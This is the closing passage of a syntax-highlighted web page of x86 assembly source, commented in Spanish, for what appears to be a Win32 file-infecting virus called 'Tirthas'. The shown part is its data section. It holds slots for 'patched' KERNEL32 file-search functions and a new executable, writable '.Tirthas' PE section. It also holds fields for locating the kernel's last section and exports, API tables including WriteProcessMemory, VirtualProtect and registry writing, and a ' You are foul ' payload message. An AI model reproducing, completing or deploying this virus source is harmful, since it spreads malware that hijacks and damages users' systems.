      </span><span class="sc5">Handle_registro</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Valor</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; ORDINALES DE LAS FUNCIONES PARCHEADAS</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc5">Ordinal_funcion_1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;SetCurrentDirectoryA</span><span class="sc0">
      </span><span class="sc5">Ordinal_funcion_2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;FindFirstFileA</span><span class="sc0">
      </span><span class="sc5">Ordinal_funcion_3</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;FindNextFileA</span><span class="sc0">

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; NUEVA SECCION </span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc5">Tirthas_section</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc5">Name_section</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.Tirthas'</span><span class="sc0">
      </span><span class="sc5">Virtual_size</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Virtual_address</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          
      </span><span class="sc5">Size_of_raw_data</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Pointer_to_raw_data</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Pointer_to_relocations</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Pointer_to_line_numbers</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Number_of_relocations</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Number_of_line_numbers</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Attributes_section</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0E0000020h</span><span class="sc0">

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; SECCION DE EXPORTACIONES</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc5">Constante_seccion</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Pointer_to_raw_data_export</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; ULTIMA SECCION DEL KERNEL</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc5">Virtual_size_LS_K32</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Virtual_address_LS_K32</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          
      </span><span class="sc5">Size_of_raw_data_LS_K32</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Pointer_to_raw_data_LS_K32</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; GetProcAddress</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc5">T_GetProcAddress</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">A_GetProcAddress</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                           

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">;  API's necesarias:</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; KERNEL32.DLL</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

  </span><span class="sc5">Fuction_list_1</span><span class="sc4">:</span><span class="sc0">                              
     </span><span class="sc5">T_ExitProcess</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'ExitProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            
     </span><span class="sc5">T_FindFirstFileA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_FindNextFileA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_SetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'SetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_GetSystemTime</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'GetSystemTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_GetWindowsDirectory</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'GetWindowsDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_CreateFileA</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_CloseHandle</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_UnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_MapViewOfFile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_CreateFileMappingA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_LoadLibraryA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'LoadLibraryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_WriteFile</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_GetSystemDirectoryA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'GetSystemDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_CreateThread</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'CreateThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> 
     </span><span class="sc5">T_CopyFileA</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'CopyFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_WriteProcessMemory</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'WriteProcessMemory'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_GetCurrentProcess</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'GetCurrentProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_VirtualProtect</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'VirtualProtect'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">;  API's necesarias:</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; ADVAPI32.DLL</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

  </span><span class="sc5">Fuction_list_2</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc5">T_RegOpenKeyExA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'RegOpenKeyExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_RegCloseKey</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'RegCloseKey'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            
     </span><span class="sc5">T_RegSetValueExA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'RegSetValueExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                                              
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">;  API's necesarias:</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; USER32.DLL</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

  </span><span class="sc5">Fuction_list_3</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc5">T_MessageBoxA</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_RegisterClassA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'RegisterClassA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_CreateWindowExA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'CreateWindowExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_ShowWindow</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'ShowWindow'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">T_GetDC</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'GetDC'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">;  API's necesarias:</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; GDI32.DLL</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

  </span><span class="sc5">Fuction_list_4</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc5">T_TextOutA</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'TextOutA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; DIRECCIONES DE LAS API'S</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; KERNEL32.DLL</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Address_list_1</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc5">A_ExitProcess</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">           
     </span><span class="sc5">A_FindFirstFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_FindNextFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_SetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_GetSystemTime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_GetWindowsDirectory</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_CreateFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_CloseHandle</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_UnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_MapViewOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_CreateFileMappingA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_LoadLibraryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_WriteFile</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_GetSystemDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_CreateThread</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_CopyFileA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_WriteProcessMemory</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_GetCurrentProcess</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_VirtualProtect</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; DIRECCIONES DE LAS API'S</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; ADVAPI32.DLL</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

  </span><span class="sc5">Address_list_2</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc5">A_RegOpenKeyExA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_RegCloseKey</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">          
     </span><span class="sc5">A_RegSetValueExA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; DIRECCIONES DE LAS API'S</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; USE32.DLL</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

  </span><span class="sc5">Address_list_3</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc5">A_MessageBoxA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_RegisterClassA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_CreateWindowExA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_ShowWindow</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">A_GetDC</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; DIRECCIONES DE LAS API'S</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; GDI32.DLL</span><span class="sc0">
  </span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

  </span><span class="sc5">Address_list_4</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc5">A_TextOutA</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
  </span><span class="sc1">; ESTRUCTURAS</span><span class="sc0">
  </span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Inftime</span><span class="sc0">               </span><span class="sc9">STRUC</span><span class="sc0">
        </span><span class="sc5">LowDate</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">HighDate</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Inftime</span><span class="sc0">               </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">Info_file</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
     </span><span class="sc5">Attributes</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">CTime</span><span class="sc0">            </span><span class="sc5">Inftime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">LAccess</span><span class="sc0">          </span><span class="sc5">Inftime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">LWrite</span><span class="sc0">           </span><span class="sc5">Inftime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">FSizeH</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">FSizeL</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">Reservado1</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">Reservado2</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">FileName</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">104h</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
     </span><span class="sc5">Division</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">   </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">date_system</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
     </span><span class="sc5">Year</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">      
     </span><span class="sc5">Month</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">   
     </span><span class="sc5">DayOfWeek</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">   
     </span><span class="sc5">Day</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> 
     </span><span class="sc5">Hour</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">  
     </span><span class="sc5">Minute</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">Second</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">  
     </span><span class="sc5">Milliseconds</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Windows_class</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
     </span><span class="sc5">Style</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">1000h</span><span class="sc0">
     </span><span class="sc5">WndProc</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">ClsExtra</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">WndExtra</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">HandleInstance</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">         
     </span><span class="sc5">HandleIcon</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">        
     </span><span class="sc5">HandleCursor</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">         
     </span><span class="sc5">HbrBackground</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">      
     </span><span class="sc5">MenuName</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">        
     </span><span class="sc5">ClassName</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Name_class</span><span class="sc0">     

     </span><span class="sc5">Title_Windows</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc3">"Kernel32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">Name_class</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc3">"System32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">Texto</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc3">" You are foul "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Tirthas_end</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Tirthas</span><span class="sc0">
</span></div></body>
</html>
